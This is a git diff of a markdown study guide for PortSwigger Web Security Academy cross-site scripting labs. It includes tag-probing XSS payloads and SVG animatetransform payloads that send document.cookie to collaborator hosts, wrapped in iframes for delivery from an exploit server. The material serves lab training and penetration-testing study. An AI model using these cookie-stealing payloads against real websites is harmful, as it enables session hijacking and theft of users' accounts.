@@ -291,41 +291,45 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 + [CSP Evaluator](https://csp-evaluator.withgoogle.com/)  
   
->Set a unsecured test cookie in browser using DEV tools console to use during test for POC XSS cookie stealer payload on myself.  
+>Set a unsecured test cookie in browser using browser DEV tools console to use during tests for POC XSS cookie stealer payload on myself.  
 
 ```JavaScript
 document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
 ```  
   
+### Identify allowed Tags  
+
 >Basic XSS Payloads to ***identify*** application controls for handling data received in HTTP request.   
 
 ```html
 <img src=1 onerror=alert(1)>
 ```  
 
->Submitting the above payload may give response message, ***"Tag is not allowed"***. Then ***identify*** allowed tags using [methodology](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked).  
+```html
+"><svg><animatetransform onbegin=alert(1)>
+```  
 
-### Identify allowed Tags  
+>Submitting the above payloads may give response message, ***"Tag is not allowed"***. Then ***identify*** allowed tags using [methodology](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked).  
 
 >The below lab gives great **Methodology** to ***identify*** allowed HTML tags and events for crafting POC XSS.  
 
-[PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
-  
 >Host **iframe** code on exploit server and deliver exploit link to victim.  
 
 ```html
 <iframe src="https://TARGET.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E">  
 ```  
-  
+
+[PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
+    
 ### Bypass Blocked Tags   
   
->Application controls give message, ***"Tag is not allowed"*** when inserting basic XSS payloads, but discover SVG mark-up allowed using above methodology. This payload steal my own session cookie as POC.  
+>Application controls give message, ***"Tag is not allowed"*** when inserting basic XSS payloads, but discover SVG mark-up allowed using above [methodology](#identify-allowed-tags). This payload steal my own session cookie as POC.  
 
 ```html
 https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2Fcollaboration.net%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E
 ```  
 
->Place the above payload on exploit server and insert URL with search value into an **iframe** before delivering to victim in below code block.  
+>Place the above payload on exploit server and insert URL with search value into an ```iframe``` before delivering to victim in below code block.  
 
 ```html
 <iframe src="https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FCOLLABORATOR.com%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E">
